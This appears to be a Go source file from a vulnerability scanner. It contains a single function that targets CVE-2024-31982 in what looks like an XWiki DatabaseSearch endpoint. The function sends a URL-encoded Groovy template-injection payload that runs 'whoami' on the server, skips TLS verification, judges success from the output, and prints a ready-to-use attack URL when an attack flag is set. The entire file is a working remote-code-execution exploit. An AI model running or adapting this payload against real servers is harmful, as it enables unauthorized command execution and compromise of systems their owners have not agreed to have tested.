package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_31982(url string, Attack bool) error {
	//fmt.Println("CVE_2024_31982")
	url1 := fmt.Sprintf("%s/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%%7D%%7D%%7D%%7B%%7Basync%%20async%%3Dfalse%%7D%%7D%%7B%%7Bgroovy%%7D%%7Dprintln(%%22whoami%%22.execute().text)%%7B%%7B%%2Fgroovy%%7D%%7D%%7B%%7B%%2Fasync%%7D%%7D", url)
	url2 := fmt.Sprintf("%s/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%%7D%%7D%%7D%%7B%%7Basync%%20async%%3Dfalse%%7D%%7D%%7B%%7Bgroovy%%7D%%7Dprintln(%%22whoami%%22.execute().text)%%7B%%7B%%2Fgroovy%%7D%%7D%%7B%%7B%%2Fasync%%7D%%7D", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(response.Body)
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}
	if ((strings.Contains(string(body), "root</description>") || strings.Contains(strings.ToLower(string(body)), "administrator</description>")) && !strings.Contains(strings.ToLower(string(body)), "async")) || ((strings.Contains(string(body2), "root</description>") || strings.Contains(strings.ToLower(string(body2)), "administrator</description>")) && !strings.Contains(strings.ToLower(string(body2)), "async")) {
		fmt.Println("[*]CVE-2024-31982 : " + url)
		if Attack {
			if strings.Contains(string(body2), "not be found") {
				fmt.Println("Attack-Result : " + url1 + "(如目标网站有认证功能，请尝试认证后使用)\n")
			} else {
				fmt.Println("Attack-Result : " + url2 + "(如目标网站有认证功能，请尝试认证后使用)\n")
			}
		}
	}
	defer response.Body.Close()

	return nil
}
